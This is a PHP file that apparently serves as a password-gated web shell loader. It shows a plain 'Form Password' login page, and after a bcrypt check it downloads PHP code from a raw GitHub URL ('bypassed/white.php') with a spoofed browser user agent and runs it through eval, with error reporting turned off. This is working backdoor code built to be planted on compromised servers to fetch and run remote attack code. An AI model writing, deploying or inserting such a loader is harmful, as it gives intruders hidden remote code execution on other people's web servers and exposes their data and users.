<?php
session_start();
error_reporting(0);

$hashed_password = '$2a$12$BwZzgti4L8PMWKqGnBgJYOL8iAhXKwepcYY4eKDS5ds8moquQxhve';
$timeout = 3600;

if (isset($_SESSION['login_time']) && (time() - $_SESSION['login_time']) > $timeout) {
    session_unset();
    session_destroy();
}

if (isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true) {
    $_SESSION['login_time'] = time();

    $u = 'https://raw.githubusercontent.com/maw3six/maw3six/refs/heads/main/bypassed/white.php';

    function f($x) {
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $x);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, false);
        curl_setopt($c, CURLOPT_HEADER, false);
        curl_setopt($c, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
        $d = curl_exec($c);
        if (curl_errno($c)) {
            curl_close($c);
            return false;
        }
        curl_close($c);
        return $d;
    }

    $c = f($u);

    if ($c === false || empty($c)) {
        die("[ERROR] Get.");
    }

    eval("?>" . $c);
    exit;
}

// Logout manual
if (isset($_GET['logout'])) {
    session_unset();
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Login form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['password']) && password_verify($_POST['password'], $hashed_password)) {
        $_SESSION['logged_in'] = true;
        $_SESSION['login_time'] = time();
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = "Password Bro!";
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Form Password</title>
    <style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:sans-serif;background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}form{background:#f2f2f2;padding:2rem;max-width:400px}input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;font-size:16px}input[type="submit"]{color:#fff;border:none;cursor:pointer;transition:background .3s}input[type="submit"]:hover{background:#45a049}.error{color:red;margin-bottom:1rem;text-align:center}</style>
</head>
<body>
    <form method="post">
        <?php if (isset($error)): ?>
            <p class="error"><?php echo htmlspecialchars($error); ?></p>
        <?php endif; ?>

        <input type="password" name="password" placeholder="Pass" required>
        <input type="submit" value="Go">
    </form>
</body>
</html>
